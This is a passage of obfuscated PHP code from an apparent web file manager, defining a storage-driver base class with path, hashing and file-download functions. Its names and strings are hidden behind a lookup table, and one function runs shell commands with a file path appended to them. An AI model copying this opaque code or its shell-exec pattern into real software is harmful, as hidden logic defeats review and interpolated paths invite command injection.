|| count($ö‚ØØ«Ø) == 0) { break; } $úˆÆŞí[$Ÿ–Ú¯Ì[354]][$˜ïòÇê¼][1] = $ö‚ØØ«Ø; $this->optionsValue($úˆÆŞí); $æÒ¬Âˆ += parent::delete($éôĞš±â); } return $æÒ¬Âˆ; } private function findWhereField($ĞÛŞ¤ã²) { $£º¢‘Šü =& $_SERVER[öæÛ¿©¿]; $ä±ô¿Ü¥ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ĞÛŞ¤ã²) || !is_array($ĞÛŞ¤ã²[$£º¢‘Šü[354]])) { return !1; } foreach ($ĞÛŞ¤ã²[$£º¢‘Šü[354]] as $ıÎµŒ´™ => $¿İêÕôŒ) { if (is_array($¿İêÕôŒ) && isset($¿İêÕôŒ[0]) && is_string($¿İêÕôŒ[0]) && strtolower($¿İêÕôŒ[0]) == $£º¢‘Šü[7] && is_array($¿İêÕôŒ[1]) && count($¿İêÕôŒ[1]) > $ä±ô¿Ü¥) { ignore_timeout(); return $ıÎµŒ´™; } } return !1; } public function setMasterDB($÷ÎÈ¶§ = true) { think_config($_SERVER[öæÛ¿©¿][482], $÷ÎÈ¶§); } } goto eâÆ¿ëíƒì; b·¥ç —ˆ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ŠÅâæ­ù =& $_SERVER[öæÛ¿©¿]; $this->objectDriver = array($ŠÅâæ­ù[60], $ŠÅâæ­ù[61], $ŠÅâæ­ù[62], $ŠÅâæ­ù[63], $ŠÅâæ­ù[64], $ŠÅâæ­ù[65], $ŠÅâæ­ù[66], $ŠÅâæ­ù[67], $ŠÅâæ­ù[68], $ŠÅâæ­ù[69], $ŠÅâæ­ù[70], $ŠÅâæ­ù[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¬ô‘Óš¿) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¬ô‘Óš¿, $_SERVER[öæÛ¿©¿][8]); } return $¬ô‘Óš¿; } public function iconvApp($¤›Ü­²Ğ) { return $¤›Ü­²Ğ; } public function iconvSystem($‘ÚĞ‹) { return $‘ÚĞ‹; } public function iconvTo($Úà •êŸ, $â¡í€×, $ËÒã›ƒ¤) { $ã·˜Èô† =& $_SERVER[öæÛ¿©¿]; if (!$Úà •êŸ || !function_exists($ã·˜Èô†[72])) { return $Úà •êŸ; } static $ÃêıÁÈ = array(); $Ç™èà´Ñ = $â¡í€× . $ã·˜Èô†[73] . $ËÒã›ƒ¤ . $ã·˜Èô†[74] . $Úà •êŸ; if (isset($ÃêıÁÈ[$Ç™èà´Ñ])) { return $ÃêıÁÈ[$Ç™èà´Ñ]; } if (function_exists($ã·˜Èô†[75])) { $ûœ¯† = @mb_convert_encoding($Úà •êŸ, $ËÒã›ƒ¤, $â¡í€×); } else { $ûœ¯† = @iconv($â¡í€×, $ËÒã›ƒ¤, $Úà •êŸ); } $ûœ¯† = $ûœ¯† ? $ûœ¯† : $Úà •êŸ; if (strstr($ûœ¯†, $ã·˜Èô†[76])) { $ûœ¯† = str_replace($ã·˜Èô†[76], $ã·˜Èô†[11], $ûœ¯†); } $ÃêıÁÈ[$â¡í€× . $ã·˜Èô†[73] . $ËÒã›ƒ¤ . $ã·˜Èô†[74] . $Úà •êŸ] = $ûœ¯†; $ÃêıÁÈ[$ËÒã›ƒ¤ . $ã·˜Èô†[73] . $â¡í€× . $ã·˜Èô†[74] . $Úà •êŸ] = $Úà •êŸ; $ÃêıÁÈ[$ËÒã›ƒ¤ . $ã·˜Èô†[73] . $â¡í€× . $ã·˜Èô†[74] . $ûœ¯†] = $Úà •êŸ; $ÃêıÁÈ[$â¡í€× . $ã·˜Èô†[73] . $ËÒã›ƒ¤ . $ã·˜Èô†[74] . $ûœ¯†] = $ûœ¯†; return $ûœ¯†; } public function getPathInner($µåéƒÍÓ) { $³Ä”›òæ = IO::init($µåéƒÍÓ); return $³Ä”›òæ->path; } public function getPathOuter($¿†•©) { $—°æ’ê =& $_SERVER[öæÛ¿©¿]; $¸ØĞÒ« = strlen(trim($this->pathBase, $—°æ’ê[8])); $¿†•© = substr(trim($¿†•©, $—°æ’ê[8]), $¸ØĞÒ«); return $this->pathDriver . $—°æ’ê[8] . ltrim($¿†•©, $—°æ’ê[8]); } public function isParentOf($şúºœØ, $öÜê†îŒ) { $øÊ‡å­á =& $_SERVER[öæÛ¿©¿]; $şúºœØ = rtrim(strtolower($şúºœØ), $øÊ‡å­á[8]) . $øÊ‡å­á[8]; $öÜê†îŒ = rtrim(strtolower($öÜê†îŒ), $øÊ‡å­á[8]) . $øÊ‡å­á[8]; $œì‘ç·Š = strpos($öÜê†îŒ, $şúºœØ) === 0; return $œì‘ç·Š; } public function getType() { $ ›Œ¡Ó… =& $_SERVER[öæÛ¿©¿]; $ÂºœÃˆ‡ = str_replace($ ›Œ¡Ó…[77], $ ›Œ¡Ó…[12], get_class($this)); return strtolower($ÂºœÃˆ‡); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¾·»é¥å, $®çÖŒƒˆ) { $Â†›©ê =& $_SERVER[öæÛ¿©¿]; $œ¬ƒç…È = rtrim($¾·»é¥å, $Â†›©ê[8]) . $Â†›©ê[8] . $®çÖŒƒˆ; $ïºé•Š = $this->exist($œ¬ƒç…È); return $ïºé•Š ? $œ¬ƒç…È : !1; } public function setModifyTime($€·³é±ú, $şŞÜûš× = '') { } public function renameObject($à£÷ºÕÍ, $ú‚šŸæ) { $º¤‚…ª½ = $ú‚šŸæ; $à£÷ºÕÍ = $this->getPathOuter($à£÷ºÕÍ); $ú‚šŸæ = $this->pathFather($à£÷ºÕÍ) . $ú‚šŸæ; $ßÏ¡²‚‡ = IO::copy($à£÷ºÕÍ, $this->pathFather($à£÷ºÕÍ), REPEAT_RENAME_FOLDER, $º¤‚…ª½); if ($ßÏ¡²‚‡) { IO::remove($à£÷ºÕÍ); } return $ßÏ¡²‚‡ ? $ú‚šŸæ : !1; } public function tempFile($ú›ÍÙ÷° = '', $û»Æ¢¦Æ = '') { if (!$ú›ÍÙ÷°) { $ú›ÍÙ÷° = rand_string(15); } $ùº¶îÆ• = TEMP_FILES . rand_string(15) . $_SERVER[öæÛ¿©¿][8]; @mkdir($ùº¶îÆ•, DEFAULT_PERRMISSIONS, !0); $Üä½˜ ‡ = $ùº¶îÆ• . $ú›ÍÙ÷°; @touch($Üä½˜ ‡); if ($û»Æ¢¦Æ) { file_put_contents($Üä½˜ ‡, $û»Æ¢¦Æ); } return $Üä½˜ ‡; } public function tempFileRemve($÷•§ä¹­) { @unlink($÷•§ä¹­); @rmdir($this->pathFather($÷•§ä¹­)); } public function mkfile($…çèÕ¿Ğ, $«Ñ’©× = '', $²å°ş¼™ = REPEAT_RENAME) { } public function mkdir($‚ü Çû, $¹øÁ—÷İ = REPEAT_SKIP) { } public function delFile($¼îŞğí„) { } public function delFolder($ˆà£×şĞ) { } public function copyFile($¤‹­ÓÊ, $İúÁ…ñÅ) { } public function moveFile($§êÁÏ‰¶, $·è ºÆù) { } public function remove($—Ş¬óŸ) { if ($this->isFile($—Ş¬óŸ)) { return $this->delFile($—Ş¬óŸ); } return $this->delFolder($—Ş¬óŸ); } public function rename($”ô—ÎË, $İ÷…Æèü) { } public function exist($¿Ù·ÉæÆ) { } public function isFile($Ì¡éç¡ƒ) { } public function isFolder($­úå’) { } public function size($›ŠŠê±ï) { } public function info($¡Õ§Èê•) { } public function infoSimple($Õå¤ÔÎÈ) { return $this->info($Õå¤ÔÎÈ); } public function infoAuth($€àô±Ç) { return $this->info($€àô±Ç); } public function infoFull($¾—–è¶¡) { return $this->info($¾—–è¶¡); } public function infoFullSimple($ôÜßúé®) { return $this->info($ôÜßúé®); } public function infoWithChildren($óÎ¥‚Ó‘) { $œ €è‹– =& $_SERVER[öæÛ¿©¿]; static $ŠÂéıâé = array(); if (isset($ŠÂéıâé[$óÎ¥‚Ó‘])) { return $ŠÂéıâé[$óÎ¥‚Ó‘]; } $í›ÙÀºá = $this->info($óÎ¥‚Ó‘); if ($í›ÙÀºá && $í›ÙÀºá[$œ €è‹–[33]] == $œ €è‹–[78]) { $ú¿ÎŞÖ = array($œ €è‹–[79] => 0, $œ €è‹–[80] => 0, $œ €è‹–[81] => 0); $this->infoChildren($óÎ¥‚Ó‘, $ú¿ÎŞÖ); $í›ÙÀºá[$œ €è‹–[79]] = $ú¿ÎŞÖ[$œ €è‹–[79]]; $í›ÙÀºá[$œ €è‹–[82]] = array($œ €è‹–[83] => $ú¿ÎŞÖ[$œ €è‹–[80]], $œ €è‹–[84] => $ú¿ÎŞÖ[$œ €è‹–[81]]); $ŠÂéıâé[$óÎ¥‚Ó‘] = $í›ÙÀºá; } return $í›ÙÀºá; } public function listPath($’çôÚ––, $–êÄÎÄ¾ = false) { } public function has($¡¹ı°¬, $·èƒ×˜ = false, $í®ÖÔß = false) { } public function canRead($·ò°­›á) { } public function canWrite($Ë›ÍùšÄ) { } public function getContent($™¯ëûï¢) { } public function setContent($­¯Æ§²î, $¥Î£‹¬¦ = '') { } protected function infoChildren($¹Ü­™çî, &$´¬„âÅ‹) { $Œ¼€ü§ =& $_SERVER[öæÛ¿©¿]; check_abort_echo(); $Œ¢ÁÑŞ³ = $this->listPath($¹Ü­™çî, !0); $Œ¢ÁÑŞ³ = array_merge($Œ¢ÁÑŞ³[$Œ¼€ü§[85]], $Œ¢ÁÑŞ³[$Œ¼€ü§[86]]); foreach ($Œ¢ÁÑŞ³ as $›•¶ş›Ô) { if ($›•¶ş›Ô[$Œ¼€ü§[33]] == $Œ¼€ü§[78]) { $´¬„âÅ‹[$Œ¼€ü§[81]]++; $ùæ—ŞÔ¡ = $this->getPathInner($›•¶ş›Ô[$Œ¼€ü§[87]]); $this->infoChildren($ùæ—ŞÔ¡, $´¬„âÅ‹); } else { $´¬„âÅ‹[$Œ¼€ü§[80]]++; $´¬„âÅ‹[$Œ¼€ü§[79]] += $›•¶ş›Ô[$Œ¼€ü§[79]]; } } } public function fileSubstr($£İ¾×­é, $Ò´±ºÒ¥, $”¿éì¡¥) { } public function listAll($Ìß‡Ê¸) { } public function listAllMake($Ñ¿““ú¥, &$ùçË÷¨°) { $ûÀ±Êµ¥ =& $_SERVER[öæÛ¿©¿]; check_abort_echo(); $ßËá¤½ = $this->listPath($Ñ¿““ú¥, !0); if (!$ßËá¤½) { return; } $Ÿô³˜¿å = array_merge($ßËá¤½[$ûÀ±Êµ¥[85]], $ßËá¤½[$ûÀ±Êµ¥[86]]); foreach ($Ÿô³˜¿å as $‰èÉŒâê) { $ÖÃÖÌÀ¨ = $‰èÉŒâê[$ûÀ±Êµ¥[33]] == $ûÀ±Êµ¥[78]; $…Ş³¾ÎĞ = array($ûÀ±Êµ¥[87] => $‰èÉŒâê[$ûÀ±Êµ¥[87]], $ûÀ±Êµ¥[78] => $ÖÃÖÌÀ¨); if (isset($‰èÉŒâê[$ûÀ±Êµ¥[79]])) { $…Ş³¾ÎĞ[$ûÀ±Êµ¥[79]] = $‰èÉŒâê[$ûÀ±Êµ¥[79]]; } if (isset($‰èÉŒâê[$ûÀ±Êµ¥[88]])) { $…Ş³¾ÎĞ[$ûÀ±Êµ¥[88]] = $‰èÉŒâê[$ûÀ±Êµ¥[88]]; } if (!$ÖÃÖÌÀ¨) { $ùçË÷¨°[] = $…Ş³¾ÎĞ; continue; } $ùçË÷¨°[] = $…Ş³¾ÎĞ; $ÔŠ¢½™İ = $‰èÉŒâê[$ûÀ±Êµ¥[87]]; $¾ŠÆ¨™¤ = $this->pathDriver; if (substr($‰èÉŒâê[$ûÀ±Êµ¥[87]], 0, strlen($¾ŠÆ¨™¤)) == $¾ŠÆ¨™¤) { $ÔŠ¢½™İ = substr($ÔŠ¢½™İ, strlen($¾ŠÆ¨™¤)); } $this->listAllMake($ÔŠ¢½™İ, $ùçË÷¨°); } } public function listAllSimple($ó£Õ¼–, $Ó¤¸ƒç = false) { $§ªİ¹Çñ = $this->listAll($ó£Õ¼–); return $this->listAllSimpleMake($§ªİ¹Çñ, $this->getPathOuter($ó£Õ¼–), $Ó¤¸ƒç); } public function listAllSimpleMake($åªƒ“½ï, $ó½ŸÓöÍ, $ØĞŞâŠ‰) { $°ï¹ÇÎÊ =& $_SERVER[öæÛ¿©¿]; $Ô·æÔÁ¼ = array(); $ó½ŸÓöÍ = rtrim(get_path_father($ó½ŸÓöÍ), $°ï¹ÇÎÊ[8]) . $°ï¹ÇÎÊ[8]; foreach ($åªƒ“½ï as $ƒÎÊšÕî) { $Ä˜œ£İû = array($°ï¹ÇÎÊ[87] => $ƒÎÊšÕî[$°ï¹ÇÎÊ[87]], $°ï¹ÇÎÊ[89] => $ƒÎÊšÕî[$°ï¹ÇÎÊ[87]], $°ï¹ÇÎÊ[78] => $ƒÎÊšÕî[$°ï¹ÇÎÊ[78]]); if (isset($ƒÎÊšÕî[$°ï¹ÇÎÊ[79]]) && !$ƒÎÊšÕî[$°ï¹ÇÎÊ[78]]) { $Ä˜œ£İû[$°ï¹ÇÎÊ[79]] = $ƒÎÊšÕî[$°ï¹ÇÎÊ[79]]; } if (isset($ƒÎÊšÕî[$°ï¹ÇÎÊ[88]])) { $Ä˜œ£İû[$°ï¹ÇÎÊ[88]] = $ƒÎÊšÕî[$°ï¹ÇÎÊ[88]]; } if (is_array($ƒÎÊšÕî[$°ï¹ÇÎÊ[90]])) { $Ä˜œ£İû[$°ï¹ÇÎÊ[89]] = $ƒÎÊšÕî[$°ï¹ÇÎÊ[90]][$°ï¹ÇÎÊ[87]]; $Ä˜œ£İû[$°ï¹ÇÎÊ[79]] = $ƒÎÊšÕî[$°ï¹ÇÎÊ[90]][$°ï¹ÇÎÊ[79]]; $Ä˜œ£İû[$°ï¹ÇÎÊ[88]] = $ƒÎÊšÕî[$°ï¹ÇÎÊ[90]][$°ï¹ÇÎÊ[88]]; } else { if (substr($ƒÎÊšÕî[$°ï¹ÇÎÊ[87]], 0, strlen($ó½ŸÓöÍ)) == $ó½ŸÓöÍ) { $Ä˜œ£İû[$°ï¹ÇÎÊ[87]] = substr($ƒÎÊšÕî[$°ï¹ÇÎÊ[87]], strlen($ó½ŸÓöÍ)); } } $¾¡Ìªâû = $ƒÎÊšÕî[$°ï¹ÇÎÊ[78]] ? $°ï¹ÇÎÊ[8] : $°ï¹ÇÎÊ[12]; $Ä˜œ£İû[$°ï¹ÇÎÊ[89]] = rtrim($Ä˜œ£İû[$°ï¹ÇÎÊ[89]], $°ï¹ÇÎÊ[8]) . $¾¡Ìªâû; $Ä˜œ£İû[$°ï¹ÇÎÊ[87]] = $°ï¹ÇÎÊ[8] . trim($Ä˜œ£İû[$°ï¹ÇÎÊ[87]], $°ï¹ÇÎÊ[8]) . $¾¡Ìªâû; if (!$ØĞŞâŠ‰) { $êœ›ñãÖ = explode($°ï¹ÇÎÊ[8], trim($Ä˜œ£İû[$°ï¹ÇÎÊ[87]], $°ï¹ÇÎÊ[8])); $Ä˜œ£İû[$°ï¹ÇÎÊ[87]] = $°ï¹ÇÎÊ[8] . implode($°ï¹ÇÎÊ[8], array_slice($êœ›ñãÖ, 1)) . $¾¡Ìªâû; } $Ô·æÔÁ¼[] = $Ä˜œ£İû; } return array_sort_by($Ô·æÔÁ¼, $°ï¹ÇÎÊ[87]); } public function upload($êÑ«§ì—, $æÜ²ññå, $¯şœÅ¦ş = false, $İ„Ç²­ = REPEAT_REPLACE) { } public function uploadFileByID($ğıÍÜ², $æ…¾¸œÚ, $‘×¦Ô€­) { } public function uploadFileByPath($«¬¸âñÉ, $µ“™õŞà, $ò°ƒæ” = array()) { } public function isUploadServer() { $Ä–Ïëù™ =& $_SERVER[öæÛ¿©¿]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ä–Ïëù™[91]) { return !0; } return $GLOBALS[$Ä–Ïëù™[6]][$Ä–Ïëù™[92]][$Ä–Ïëù™[93]]; } public function isFileOutServer() { $Û¬ÎÅ¢ =& $_SERVER[öæÛ¿©¿]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Û¬ÎÅ¢[91]) { return !0; } return $GLOBALS[$Û¬ÎÅ¢[6]][$Û¬ÎÅ¢[92]][$Û¬ÎÅ¢[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Ğù¨®ÑÔ) { $ŸùÌòüŸ =& $_SERVER[öæÛ¿©¿]; if (!$this->isCdnHost()) { return $Ğù¨®ÑÔ; } return str_replace(trim(get_url_root($Ğù¨®ÑÔ), $ŸùÌòüŸ[8]), trim($this->cdnHost, $ŸùÌòüŸ[8]), $Ğù¨®ÑÔ); } public function uploadLink($™¢º·×Æ, $¿µæÈ¢Ö = 0) { $¥è®¨‹ç =& $_SERVER[öæÛ¿©¿]; if ($this->isUploadServer()) { return; } $úÔö¿¾Ó = $this->getType(); if (!in_array($úÔö¿¾Ó, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $øÚ·—ä° = 1024 * 1024 * 10; $ï…³æç· = (!$¿µæÈ¢Ö ? 1 : ceil($¿µæÈ¢Ö / pow(1024, 3))) * 3600 * 4; if ($¿µæÈ¢Ö <= $øÚ·—ä°) { $’ØßÁê´ = $this->uploadFormData($™¢º·×Æ, $ï…³æç·); } else { $’ØßÁê´ = $this->uploadMultiData($™¢º·×Æ, $ï…³æç·); } if ($’ØßÁê´) { $’ØßÁê´[$¥è®¨‹ç[95]] = $™¢º·×Æ; $’ØßÁê´[$¥è®¨‹ç[96]] = $úÔö¿¾Ó; } return $’ØßÁê´; } public function uploadFormData($ä–õé­†, $½‰ó†¾Û = 3600) { } public function uploadMultiData($àöş•², $‡‘Éïíİ = 3600) { } public function multiUploadFormData($ÉŞ©İ€‰, $™Û±»“£ = 3600) { return $this->uploadMultiData($ÉŞ©İ€‰, $™Û±»“£); } public function download($ğ¢«ïüá, $¬¶ØŸÒ) { } public function ext($¾çú‹ïÏ) { $ãùãµ²é =& $_SERVER[öæÛ¿©¿]; if (strpos($¾çú‹ïÏ, $ãùãµ²é[8]) === -1) { $š¶ïàöæ = $¾çú‹ïÏ; } else { $š¶ïàöæ = $this->pathThis($¾çú‹ïÏ); } $÷ıó‹æó = $ãùãµ²é[12]; if (strstr($š¶ïàöæ, $ãùãµ²é[10])) { $÷ıó‹æó = substr($š¶ïàöæ, strrpos($š¶ïàöæ, $ãùãµ²é[10]) + 1); $÷ıó‹æó = strtolower($÷ıó‹æó); } if (strlen($÷ıó‹æó) > 3 && preg_match($ãùãµ²é[97], $÷ıó‹æó, $Îı™Îè…)) { $÷ıó‹æó = $ãùãµ²é[12]; } return $÷ıó‹æó; } public function pathThis($Ú¼×ÙíÃ) { $­ùÚı¾ê =& $_SERVER[öæÛ¿©¿]; $Ú¼×ÙíÃ = str_replace($­ùÚı¾ê[98], $­ùÚı¾ê[8], rtrim($Ú¼×ÙíÃ, $­ùÚı¾ê[8])); $©ôâ²×› = strrpos($Ú¼×ÙíÃ, $­ùÚı¾ê[8]); if ($©ôâ²×› === !1) { return $Ú¼×ÙíÃ; } return substr($Ú¼×ÙíÃ, $©ôâ²×› + 1); } public function pathFather($ˆšõò€) { $¾ºÜ¥è =& $_SERVER[öæÛ¿©¿]; $ˆšõò€ = str_replace($¾ºÜ¥è[98], $¾ºÜ¥è[8], rtrim($ˆšõò€, $¾ºÜ¥è[8])); $¸š‚ê³ğ = strrpos($ˆšõò€, $¾ºÜ¥è[8]); if ($¸š‚ê³ğ === !1) { return $¾ºÜ¥è[12]; } return substr($ˆšõò€, 0, $¸š‚ê³ğ + 1); } public function hashSimple($ÑÚ¯Æï–) { $¸ÌñÈ²© =& $_SERVER[öæÛ¿©¿]; if (!$ÑÚ¯Æï–) { return md5($¸ÌñÈ²©[12]); } $¹µşË„ë = $this->size($ÑÚ¯Æï–); $èÚ’¢ = 200; $ñ¼îï¦Ú = 50; if ($¹µşË„ë <= $èÚ’¢ * $ñ¼îï¦Ú) { return $this->hashMd5($ÑÚ¯Æï–) . $¹µşË„ë; } $ĞÀ‹«Ÿ = intval($¹µşË„ë / $ñ¼îï¦Ú); $³¶ü¸Ëå = $¸ÌñÈ²©[12]; for ($Øßš = 0; $Øßš < $ñ¼îï¦Ú; $Øßš++) { $³¶ü¸Ëå .= $this->fileSubstr($ÑÚ¯Æï–, $ĞÀ‹«Ÿ * $Øßš, $èÚ’¢); } $³¶ü¸Ëå .= $this->fileSubstr($ÑÚ¯Æï–, $¹µşË„ë - $èÚ’¢, $èÚ’¢); return md5($³¶ü¸Ëå) . $¹µşË„ë; } public static $md5Cache = array(); public function hashMd5($İñûÙ¢) { if (!$İñûÙ¢) { return md5($_SERVER[öæÛ¿©¿][12]); } $İñûÙ¢ = $this->iconvSystem($İñûÙ¢); if (isset(self::$md5Cache[$İñûÙ¢])) { return self::$md5Cache[$İñûÙ¢]; } self::$md5Cache[$İñûÙ¢] = $this->hashMd5Shell($İñûÙ¢); if (!self::$md5Cache[$İñûÙ¢]) { self::$md5Cache[$İñûÙ¢] = @md5_file($İñûÙ¢); } return self::$md5Cache[$İñûÙ¢]; } private function hashMd5Shell($ö€õ‰„æ) { $Ù¸µ˜Äˆ =& $_SERVER[öæÛ¿©¿]; if (!$ö€õ‰„æ) { return md5($Ù¸µ˜Äˆ[12]); } if (!function_exists($Ù¸µ˜Äˆ[99])) { return !1; } $‡ô¦‹Ú = array($Ù¸µ˜Äˆ[100], $Ù¸µ˜Äˆ[101]); $„Ç€¯†Ê = Cache::get($Ù¸µ˜Äˆ[102]); if (!$„Ç€¯†Ê) { $–¦™Ò—Ä = BASIC_PATH . $Ù¸µ˜Äˆ[103]; $¯¤´ñœ = md5_file($–¦™Ò—Ä); $„Ç€¯†Ê = $Ù¸µ˜Äˆ[104]; foreach ($‡ô¦‹Ú as $³ÊüÅ˜) { $Í€¸­Œ = shell_exec($³ÊüÅ˜ . "\40\42{$–¦™Ò—Ä}\x22"); if ($Í€¸­Œ && substr(trim($Í€¸­Œ), 0, 32) == $¯¤´ñœ) { $„Ç€¯†Ê = $³ÊüÅ˜; break; } } Cache::set($Ù¸µ˜Äˆ[102], $„Ç€¯†Ê, 3600); } if ($„Ç€¯†Ê == $Ù¸µ˜Äˆ[104]) { return !1; } $Í€¸­Œ = shell_exec($„Ç€¯†Ê . "\x20\42{$ö€õ‰„æ}\42"); $Í€¸­Œ = str_replace($Ù¸µ˜Äˆ[105], $Ù¸µ˜Äˆ[12], $Í€¸­Œ); return substr($Í€¸­Œ, 0, 32); } public function link($´ŠŒìõ) { return $´ŠŒìõ; } public function fileOut($ñéÉãùû, $„¢”îº÷ = false, $›ŞÎØå = false, $ãş®£·ï = '') { $ë’„Àòà =& $_SERVER[öæÛ¿©¿]; $this->cacheMethod(null, null); if (!$ñéÉãùû || !$this->exist($ñéÉãùû)) { show_json(LNG($ë’„Àòà[106]), !1, $›ŞÎØå); } $î¥Ïñµ÷ = $this->getType() == $ë’„Àòà[107]; $¥ÆÖ¹ØÖ = $GLOBALS[$ë’„Àòà[6]][$ë’„Àòà[92]][$ë’„Àòà[108]][$ë’„Àòà[109]]; $É¶ùÒ†† = (double) $GLOBALS[$ë’„Àòà[6]][$ë’„Àòà[92]][$ë’„Àòà[108]][$ë’„Àòà[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ãüèå÷ = $this->infoFull($ñéÉãùû); $‘û¥¸†¥ = $ãüèå÷[$ë’„Àòà[79]]; $İÖÈÑäã = gmdate($ë’„Àòà[111], $ãüèå÷[$ë’„Àòà[88]]); $ªã…¦ = $›ŞÎØå ? $›ŞÎØå : $this->iconvApp($ãüèå÷[$ë’„Àòà[32]]); $¹Ì·µôÔ = 0; $ÇÎ§Õş™ = $‘û¥¸†¥ - 1; $è™ÀËí¤ = $this->ext($ªã…¦); if (in_array($è™ÀËí¤, array($ë’„Àòà[112], $ë’„Àòà[113], $ë’„Àòà[114], $ë’„Àòà[115]))) { $è™ÀËí¤ = $ë’„Àòà[116]; } if (in_array($è™ÀËí¤, array($ë’„Àòà[117]))) { $è™ÀËí¤ = $ë’„Àòà[118]; } if (!$ãş®£·ï) { $ãş®£·ï = md5($İÖÈÑäã . $‘û¥¸†¥); } $ãş®£·ï = $ë’„Àòà[119] . $ãş®£·ï . $ë’„Àòà[119]; $ŞêÈ¸çÏ = get_file_mime($è™ÀËí¤); $İ–£¦†ã = !0; $İ–£¦†ã = isset($_GET[$ë’„Àòà[120]]) ? !1 : !0; if ($„¢”îº÷ === !1 && !mime_support($ŞêÈ¸çÏ)) { $ŞêÈ¸çÏ = $ë’„Àòà[121]; } header($ë’„Àòà[122]); header($ë’„Àòà[123] . $ŞêÈ¸çÏ); $²¿ş¯Ê = rawurlencode($ªã…¦); $²¿ş¯Ê = $ë’„Àòà[119] . $²¿ş¯Ê . $ë’„Àòà[124] . $²¿ş¯Ê; if ($„¢”îº÷) { header($ë’„Àòà[125]); header($ë’„Àòà[126] . $²¿ş¯Ê); } else { if ($İ–£¦†ã) { header($ë’„Àòà[127] . $²¿ş¯Ê); } } $åŸ©¡ïë = 3600 * 24 * 30; header($ë’„Àòà[128]); header($ë’„Àòà[129]); header($ë’„Àòà[130] . $åŸ©¡ïë); header($ë’„Àòà[131] . gmdate($ë’„Àòà[111], time() + $åŸ©¡ïë) . $ë’„Àòà[132]); if (isset($_SERVER[$ë’„Àòà[133]]) && strtotime($_SERVER[$ë’„Àòà[133]]) == $ãüèå÷[$ë’„Àòà[88]]) { header($ë’„Àòà[134], !0, 304); die; } if (isset($_SERVER[$ë’„Àòà[135]]) && $_SERVER[$ë’„Àòà[135]] == $ãş®£·ï) { header($ë’„Àòà[136] . $ãş®£·ï, !0, 304); die; } header($ë’„Àòà[136] . $ãş®£·ï); header($ë’„Àòà[137] . $İÖÈÑäã . $ë’„Àòà[132]); header($ë’„Àòà[138] . rawurlencode($ªã…¦)); header($ë’„Àòà[139]); header($ë’„Àòà[140] . $‘û¥¸†¥); header($ë’„Àòà[141]); Hook::trigger($ë’„Àòà[142], $ñéÉãùû, $‘û¥¸†¥, $ªã…¦, $è™ÀËí¤); if (!$„¢”îº÷ && $è™ÀËí¤ == $ë’„Àòà[143]) { if ($‘û¥¸†¥ > 1024 * 1024 * 10) { die; } $øŸ½° = $this->getContent($ñéÉãùû); $øŸ½° = Html::clearSVG($øŸ½°); header($ë’„Àòà[144] . strlen($øŸ½°)); echo $øŸ½°; die; } $û´ÍÚÛ = strtolower($_SERVER[$ë’„Àòà[145]]); if ($î¥Ïñµ÷ && $û´ÍÚÛ && $¥ÆÖ¹ØÖ) { if (strstr($û´ÍÚÛ, $ë’„Àòà[146])) { header($ë’„Àòà[147] . $ñéÉãùû); } else { if (strstr($û´ÍÚÛ, $ë’„Àòà[148])) { header($ë’„Àòà[149] . $ñéÉãùû); } else { if (strstr($û´ÍÚÛ, $ë’„Àòà[150])) { header($ë’„Àòà[151] . $ñéÉãùû); } } } if ($É¶ùÒ††) { header($ë’„Àòà[152] . $É¶ùÒ††); } return; } if (isset($_SERVER[$ë’„Àòà[153]])) { if (preg_match($ë’„Àòà[154], $_SERVER[$ë’„Àòà[153]], $ó‚ƒ§ùï)) { $¹Ì·µôÔ = intval($ó‚ƒ§ùï[1]); $¹Ì·µôÔ = $¹Ì·µôÔ <= 0 ? 0 : ($¹Ì·µôÔ >= $ÇÎ§Õş™ ? $ÇÎ§Õş™ : $¹Ì·µôÔ); if (!empty($ó‚ƒ§ùï[2])) { $ûä©µŞ = intval($ó‚ƒ§ùï[2]); $ÇÎ§Õş™ = $ûä©µŞ < $¹Ì·µôÔ ? $¹Ì·µôÔ : ($ûä©µŞ >= $ÇÎ§Õş™ ? $ÇÎ§Õş™ : $ûä©µŞ); } } header($ë’„Àòà[155]); header("\103\157\x6e\164\145\x6e\x74\55\x52\x61\x6e\x67\x65\x3a\40\x62\171\164\x65\x73\x20{$¹Ì·µôÔ}\x2d{$ÇÎ§Õş™}\57" . $‘û¥¸†¥); } else { header($ë’„Àòà[156]); } header($ë’„Àòà[157]); header($ë’„Àòà[158]); $§èö¦²Ş = !0; if ($_SERVER[$ë’„Àòà[159]] == $ë’„Àòà[160] && $‘û¥¸†¥ > 1204 * 1024 * 1024 * 2) { $§èö¦²Ş = !1; } if ($§èö¦²Ş) { header($ë’„Àòà[161] . ($ÇÎ§Õş™ - $¹Ì·µôÔ + 1)); } if ($_SERVER[$ë’„Àòà[162]] == $ë’„Àòà[163]) { return; } $—Ñ´ ä² = array($ë’„Àòà[164] => !1, $ë’„Àòà[165] => $¹Ì·µôÔ, $ë’„Àòà[166] => $ÇÎ§Õş™, $ë’„Àòà[167] => $è™ÀËí¤, $ë’„Àòà[168] => $ãüèå÷, $ë’„Àòà[169] => $ë’„Àòà[12], $ë’„Àòà[170] => 0); $—Ñ´ ä² = Hook::filter($ë’„Àòà[171], $—Ñ´ ä²); $âŸ¨Ñùû = 1024 * 300; $ĞïĞ×Ö = 0; if ($É¶ùÒ††) { $ĞïĞ×Ö = intval(1000 * 1000 * ($âŸ¨Ñùû / $É¶ùÒ††)); } while ($¹Ì·µôÔ <= $ÇÎ§Õş™) { $ıœµú÷ = timeFloat(); check_abort(); $ôº‚İšÙ = $ÇÎ§Õş™ - $¹Ì·µôÔ + 1; if ($ôº‚İšÙ <= $âŸ¨Ñùû) { $âŸ¨Ñùû = $ôº‚İšÙ; } $øŸ½° = $this->fileSubstr($ñéÉãùû, $¹Ì·µôÔ, $âŸ¨Ñùû); if ($—Ñ´ ä²[$ë’„Àòà[164]]) { $—Ñ´ 